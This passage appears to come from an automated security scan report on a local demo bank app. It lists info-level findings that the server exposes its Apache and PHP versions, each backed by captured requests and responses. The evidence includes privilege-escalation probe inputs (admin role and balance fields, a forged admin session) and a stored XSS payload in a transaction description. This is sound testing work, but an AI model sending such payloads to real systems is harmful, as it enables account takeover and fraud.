- CVSS: 0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N)

### Description
API responses disclose precise Apache and PHP versions through the Server and X-Powered-By headers.

### Impact
The version information helps attackers identify applicable public vulnerabilities and tailor later probes.

### Likelihood
The headers are returned to unauthenticated clients on every observed API response, although no vulnerable-version exploit was demonstrated.

### Recommendation
Suppress the X-Powered-By header and configure Apache to return a generic Server header. Keep both components patched.

### Evidence
```
The unauthenticated GET response included Server: Apache/2.4.68 (Unix) and X-Powered-By: PHP/8.4.25.

REQUEST:
POST http://localhost:8081/api/auth/register
use_session: anonymous  Authorization: present
Cookies: none
{"Content-Type": "application/json"}
{"email": "invalid-email", "password": "valid-enough-password", "first_name": "Integrity", "last_name": "Probe", "role": "admin", "is_admin": true, "balance": 999999, "verified": true}

RESPONSE:
Status: 422
date: Tue, 08 Sep 2026 13:06:18 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 154
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"VALIDATION_ERROR","message":"Validation failed","details":{"email":["The email field must be a valid email address."]}}}
```

### Request Evidence
```
POST http://localhost:8081/api/auth/register
use_session: anonymous  Authorization: present
Cookies: none
{"Content-Type": "application/json"}
{"email": "invalid-email", "password": "valid-enough-password", "first_name": "Integrity", "last_name": "Probe", "role": "admin", "is_admin": true, "balance": 999999, "verified": true}
```

### Response Evidence
```
Status: 422
date: Tue, 08 Sep 2026 13:06:18 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 154
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"VALIDATION_ERROR","message":"Validation failed","details":{"email":["The email field must be a valid email address."]}}}
```

### Validation Note
Not validated: severity 'info' is below the configured threshold 'low'.

## 54. Server and runtime versions are disclosed

- Finding reference: URBN-066
- Severity: info
- OWASP: A05
- Source: Dynamic
- Validation: skipped
- Affected URL: http://localhost:8081/api/auth/login?role=admin&isAdmin=true
- CVSS: 0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N)

### Description
API responses disclose exact Apache and PHP versions through response headers.

### Impact
The version information helps attackers identify potentially relevant component-specific vulnerabilities.

### Likelihood
The information is exposed to every remote requester, but no vulnerable component or direct exploit was demonstrated.

### Recommendation
Remove or generalize the Server and X-Powered-By headers and keep Apache and PHP patched.

### Evidence
```
The response disclosed server: Apache/2.4.68 (Unix) and x-powered-by: PHP/8.4.25.

REQUEST:
GET http://localhost:8081/api/auth/login?role=admin&isAdmin=true
use_session: anonymous  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 405
date: Tue, 08 Sep 2026 13:13:59 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 87
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"METHOD_NOT_ALLOWED","message":"Method not allowed."}}
```

### Request Evidence
```
GET http://localhost:8081/api/auth/login?role=admin&isAdmin=true
use_session: anonymous  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 405
date: Tue, 08 Sep 2026 13:13:59 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 87
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"METHOD_NOT_ALLOWED","message":"Method not allowed."}}
```

### Validation Note
Not validated: severity 'info' is below the configured threshold 'low'.

## 55. Server and runtime versions are disclosed

- Finding reference: URBN-067
- Severity: info
- OWASP: A05
- Source: Dynamic
- Validation: skipped
- Affected URL: http://localhost:8081/api/transactions?account_id=51&page=999&per_page=15
- CVSS: 0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:N)

### Description
API responses disclose exact Apache and PHP versions through response headers.

### Impact
The version details help attackers identify potentially relevant component-specific vulnerabilities.

### Likelihood
The information is available in every observed response, but no exploitable component vulnerability was demonstrated.

### Recommendation
Suppress or generalize the Server and X-Powered-By headers in production responses.

### Evidence
```
The response headers disclose server: Apache/2.4.68 (Unix) and x-powered-by: PHP/8.4.25.

REQUEST:
GET http://localhost:8081/api/transactions?account_id=51&page=999&per_page=15
use_session: anonymous  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 200
date: Tue, 08 Sep 2026 13:17:14 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 132
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"transactions":[],"pagination":{"current_page":999,"per_page":15,"total":0,"total_pages":0}},"message":"OK"}
```

### Request Evidence
```
GET http://localhost:8081/api/transactions?account_id=51&page=999&per_page=15
use_session: anonymous  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 200
date: Tue, 08 Sep 2026 13:17:14 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 132
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"transactions":[],"pagination":{"current_page":999,"per_page":15,"total":0,"total_pages":0}},"message":"OK"}
```

### Validation Note
Not validated: severity 'info' is below the configured threshold 'low'.

## 56. Server and runtime versions are disclosed

- Finding reference: URBN-069
- Severity: info
- OWASP: A05
- Source: Dynamic
- Validation: skipped
- Affected URL: http://localhost:8081/api/admin/accounts?page=1&per_page=20
- CVSS: 0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:N)

### Description
API responses disclose exact Apache and PHP versions through response headers.

### Impact
The version information can help attackers identify applicable component-specific vulnerabilities, but no exploitable component issue was demonstrated.

### Likelihood
The information is returned consistently to remote requests and requires no valid authentication.

### Recommendation
Suppress or generalize the Server header and disable PHP version exposure using expose_php=Off.

### Evidence
```
The 401 response includes Server: Apache/2.4.68 (Unix) and X-Powered-By: PHP/8.4.25.

REQUEST:
GET http://localhost:8081/api/admin/accounts?page=1&per_page=20
use_session: anonymous  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 401
date: Tue, 08 Sep 2026 13:22:33 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 76
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid token."}}
```

### Request Evidence
```
GET http://localhost:8081/api/admin/accounts?page=1&per_page=20
use_session: anonymous  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 401
date: Tue, 08 Sep 2026 13:22:33 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 76
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid token."}}
```

### Validation Note
Not validated: severity 'info' is below the configured threshold 'low'.

## 57. Server and runtime versions are disclosed

- Finding reference: URBN-072
- Severity: info
- OWASP: A05
- Source: Dynamic
- Validation: skipped
- Affected URL: http://localhost:8081/api/transactions?account_id=2&page=1&per_page=15
- CVSS: 0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:N)

### Description
HTTP response headers disclose the exact Apache and PHP versions.

### Impact
An attacker can use the version information to focus reconnaissance on applicable public vulnerabilities.

### Likelihood
The disclosure is directly observable, but no vulnerable component or related exploit was demonstrated.

### Recommendation
Configure Apache and PHP to suppress detailed version information in response headers.

### Evidence
```
The response includes Server: Apache/2.4.68 (Unix) and X-Powered-By: PHP/8.4.25.

REQUEST:
GET http://localhost:8081/api/transactions?account_id=2&page=1&per_page=15
use_session: anonymous  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 200
date: Tue, 08 Sep 2026 13:28:13 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 1318
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"transactions":[{"id":44,"from_account_id":1,"to_bsb":"062-001","to_account_number":"10000002","to_account_id":2,"amount":"0.01","description":"<img src=x onerror=\"document.body.setAttribute('data-aespa-tx','B72D')\">","transfer_type":"own","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-09-08 13:19:47","type":"credit"},{"id":3,"from_account_id":2,"to_bsb":"062-001","to_account_number":"10000001","to_account_id":1,"amount":"200.00","description":"Weekend spending","transfer_type":"own","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-02-01 10:00:00","type":"debit"},{"id":1,"from_account_id":1,"to_bsb":"062-001","to_account_number":"10000002","to_account_id":2,"amount":"500.00","description":"Monthly savings","transfer_type":"own","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-01-05 09:12:00","type":"credit"}],"pagination":{"current_page":1,"per_page":15,"total":3,"total_pages":1}},"message":"OK"}
```

### Request Evidence
```
GET http://localhost:8081/api/transactions?account_id=2&page=1&per_page=15
use_session: anonymous  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 200
date: Tue, 08 Sep 2026 13:28:13 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 1318
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"transactions":[{"id":44,"from_account_id":1,"to_bsb":"062-001","to_account_number":"10000002","to_account_id":2,"amount":"0.01","description":"<img src=x onerror=\"document.body.setAttribute('data-aespa-tx','B72D')\">","transfer_type":"own","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-09-08 13:19:47","type":"credit"},{"id":3,"from_account_id":2,"to_bsb":"062-001","to_account_number":"10000001","to_account_id":1,"amount":"200.00","description":"Weekend spending","transfer_type":"own","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-02-01 10:00:00","type":"debit"},{"id":1,"from_account_id":1,"to_bsb":"062-001","to_account_number":"10000002","to_account_id":2,"amount":"500.00","description":"Monthly savings","transfer_type":"own","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-01-05 09:12:00","type":"credit"}],"pagination":{"current_page":1,"per_page":15,"total":3,"total_pages":1}},"message":"OK"}
```

### Validation Note
Not validated: severity 'info' is below the configured threshold 'low'.

## 58. Server and runtime versions are disclosed

- Finding reference: URBN-075
- Severity: info
- OWASP: A05
- Source: Dynamic
- Validation: skipped
- Affected URL: http://localhost:8081/api/admin/customers/10
- CVSS: 0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N)

### Description
Response headers expose exact Apache and PHP versions.

### Impact
An attacker can use the version information to identify potentially applicable component-specific vulnerabilities.

### Likelihood
The disclosure is directly observable, but no vulnerable component or related exploit was demonstrated.

### Recommendation
Configure Apache and PHP to suppress detailed version information in HTTP response headers.

### Evidence
```
The response disclosed server: Apache/2.4.68 (Unix) and x-powered-by: PHP/8.4.25.

REQUEST:
GET http://localhost:8081/api/admin/customers/10
use_session: fresh_forged_admin  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 401
date: Tue, 08 Sep 2026 13:32:10 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 76
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid token."}}
```

### Request Evidence
```
GET http://localhost:8081/api/admin/customers/10
use_session: fresh_forged_admin  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 401
date: Tue, 08 Sep 2026 13:32:10 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 76
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid token."}}
```

### Validation Note
Not validated: severity 'info' is below the configured threshold 'low'.

## 59. Server and runtime versions are disclosed

- Finding reference: URBN-077
- Severity: info
- OWASP: A05
- Source: Dynamic
- Validation: skipped
- Affected URL: http://localhost:8081/admin/#/customers/11
- CVSS: 0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N)

### Description
The Server response header discloses the exact web server version and operating-system family.

### Impact
An attacker can use the disclosed version to narrow vulnerability research and tailor later probes.

### Likelihood
The information is available on every tested admin-page request, but no vulnerable Apache behavior was demonstrated.

### Recommendation
Configure Apache ServerTokens and ServerSignature to suppress detailed version information.

### Evidence
```
The response header reports "server: Apache/2.4.68 (Unix)".

REQUEST:
GET http://localhost:8081/admin/#/customers/11
use_session: anonymous  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 200
date: Tue, 08 Sep 2026 13:34:23 GMT
server: Apache/2.4.68 (Unix)
last-modified: Sun, 23 Aug 2026 12:34:31 GMT
etag: "4c9c-659b6175aa3c0"
accept-ranges: bytes
content-length: 19612
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>The Bank of Ed - Admin</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            dark: {
              50: '#f4f4f5', 100: '#e4e4e7', 200: '#d4d4d8', 300: '#a1a1aa',
              400: '#71717a', 500: '#52525b', 600: '#3f3f46', 700: '#27272a',
              800: '#18181b', 900: '#09090b', 950: '#030305'
            }
          },
          fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] }
        }
      }
    }
  </script>
  <link rel="stylesheet" href="css/app.css">
</head>
<body class="bg-dark-50 font-sans text-dark-800">

  <!-- Toast Container -->
  <div id="toast-container" class="fixed top-4 right-4 z-50 space-y-2"></div>

  <!-- Modal Overlay -->
  <div id="modal-overlay" class="hidden fixed inset-0 z-40 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4">
    <div id="modal-content" class="bg-white rounded-2xl shadow-2xl w-full max-w-md max-h-[90vh] overflow-y-auto"></div>
  </div>

  <!-- ===================== AUTH VIEW ===================== -->
  <div id="view-auth" class="hidden min-h-screen flex items-center justify-center bg-gradient-to-br from-dark-900 via-dark-800 to-dark-950 p-4">
    <div class="w-full max-w-md">
      <div class="text-center mb-8">
        <div class="inline-flex items-center gap-3">
          <div class="w-12 h-12 bg-red-600 rounded-xl flex items-center justify-center">
            <svg class="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
          </div>
          <h1 class="text-3xl font-bold text-white">The Bank of Ed</h1>
        </div>
        <p class="text-dark-400 mt-2">Administration Panel</p>
      </div>

      <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-8">
        <form id="login-form" onsubmit="BankOfEdAdmin.AuthPage.handleLogin(event)">
          <div class="space-y-5">
            <div>
              <label class="block text-sm font-medium text-dark-700 mb-1.5">Username</label>
              <input type="text" name="username" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition" placeholder="admin" autofocus>
            </div>
            <div>
              <label class="block text-sm font-medium text-dark-700 mb-1.5">Password</label>
              <input type="password" name="password" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition" placeholder="Enter password">
            </div>
          </div>
          <div id="login-errors" class="mt-4 text-sm text-red-600 hidden"></div>
          <button type="submit" class="w-full mt-6 bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded-xl transition-colors flex items-center justify-center gap-2">
            <span>Sign In</span>
            <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
          </button>
        </form>
      </div>
    </div>
  </div>

  <!-- ===================== APP SHELL ===================== -->
  <div id="app-shell" class="hidden flex h-screen overflow-hidden">

    <!-- Mobile Header -->
    <div class="lg:hidden fixed top-0 left-0 right-0 z-30 bg-dark-900 text-white flex items-center justify-between px-4 py-3">
      <button onclick="BankOfEdAdmin.App.toggleSidebar()" class="p-2 hover:bg-dark-800 rounded-lg">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
      </button>
      <div class="flex items-center gap-2">
        <div class="w-8 h-8 bg-red-600 rounded-lg flex items-center justify-center">
          <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
        </div>
        <span class="font-semibold">Admin</span>
      </div>
      <div class="w-10"></div>
    </div>

    <!-- Sidebar Overlay (mobile) -->
    <div id="sidebar-overlay" onclick="BankOfEdAdmin.App.toggleSidebar()" class="hidden fixed inset-0 z-30 bg-black/50 lg:hidden"></div>

    <!-- Sidebar -->
    <aside id="sidebar" class="fixed lg:static inset-y-0 left-0 z-40 w-64 bg-dark-900 text-white flex flex-col transform -translate-x-full lg:translate-x-0 transition-transform duration-200">
      <div class="p-6 flex items-center gap-3">
        <div class="w-10 h-10 bg-red-600 rounded-xl flex items-center justify-center flex-shrink-0">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
        </div>
        <div>
          <h2 class="font-bold text-lg">The Bank of Ed</h2>
          <p class="text-xs text-dark-400">Admin Panel</p>
        </div>
      </div>

      <nav class="flex-1 px-3 space-y-1 mt-2">
        <a href="#/customers" data-nav="customers" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
          <span>Customers</span>
        </a>
        <a href="#/accounts" data-nav="accounts" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
          <span>Accounts</span>
        </a>
        <a href="#/fx-rates" data-nav="fx-rates" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
          <span>FX Rates</span>
        </a>
        <a href="#/system" data-nav="system" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
          <span>System</span>
        </a>
      </nav>

      <div class="p-4 border-t border-dark-800">
        <div class="flex items-center gap-3 mb-3 px-2">
          <div class="w-9 h-9 bg-dark-700 rounded-full flex items-center justify-center text-sm font-semibold" id="sidebar-avatar">A</div>
          <div class="min-w-0">
            <p class="text-sm font-medium truncate" id="sidebar-admin-name">Admin</p>
          </div>
        </div>
        <button onclick="BankOfEdAdmin.App.logout()" class="w-full flex items-center gap-3 px-4 py-2.5 rounded-xl text-dark-400 hover:text-red-400 hover:bg-dark-800 transition-colors text-sm">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
          <span>Sign Out</span>
        </button>
      </div>
    </aside>

    <!-- Main Content -->
    <main class="flex-1 overflow-y-auto pt-14 lg:pt-0">
      <div class="p-4 sm:p-6 lg:p-8 max-w-7xl mx-auto">

        <!-- Customers List -->
        <section id="page-customers" class="hidden">
          <div class="flex items-center justify-between mb-6">
            <div>
              <h1 class="text-2xl font-bold text-dark-900">Customers</h1>
              <p class="text-dark-500 mt-1">Manage customer accounts</p>
            </div>
            <div class="flex items-center gap-3">
              <input type="text" id="customer-search" placeholder="Search..." class="px-4 py-2.5 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition text-sm w-48" onkeyup="BankOfEdAdmin.CustomersPage.handleSearch(event)">
            </div>
          </div>
          <div id="customers-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
          <div id="customers-pagination" class="mt-4 flex items-center justify-between"></div>
        </section>

        <!-- Customer Detail -->
        <section id="page-customer-detail" class="hidden">
          <a href="#/customers" class="inline-flex items-center gap-1 text-red-600 hover:text-red-700 text-sm font-medium mb-6">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
            Back to Customers
          </a>
          <div id="customer-detail-content"></div>
        </section>

        <!-- Accounts -->
        <section id="page-accounts" class="hidden">
          <div class="mb-6">
            <h1 class="text-2xl font-bold text-dark-900">All Accounts</h1>
            <p class="text-dark-500 mt-1">View and manage all bank accounts</p>
          </div>
          <div id="accounts-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
          <div id="accounts-pagination" class="mt-4 flex items-center justify-between"></div>
        </section>

        <!-- FX Rates -->
        <section id="page-fx-rates" class="hidden">
          <div class="flex items-center justify-between mb-6">
            <div>
              <h1 class="text-2xl font-bold text-dark-900">FX Rates</h1>
              <p class="text-dark-500 mt-1">Manage foreign exchange rates</p>
            </div>
            <button onclick="BankOfEdAdmin.FxRatesPage.showAddModal()" class="bg-red-600 hover:bg-red-700 text-white font-semibold px-5 py-2.5 rounded-xl transition-colors text-sm flex items-center gap-2">
              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path></svg>
              Add Rate
            </button>
          </div>
          <div id="fx-rates-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
        </section>

        <!-- System -->
        <section id="page-system" class="hidden">
          <div class="mb-6">
            <h1 class="text-2xl font-bold text-dark-900">System Management</h1>
            <p class="text-dark-500 mt-1">Integration settings, database operations and maintenance</p>
          </div>

          <!-- White-Label Partner Settings Card -->
          <div class="bg-white rounded-2xl shadow-sm border border-dark-100 p-6 sm:p-8 max-w-xl mb-6">
            <div class="flex items-center gap-3 mb-4">
              <div class="w-12 h-12 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-6 h-6 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"></path></svg>
              </div>
              <div>
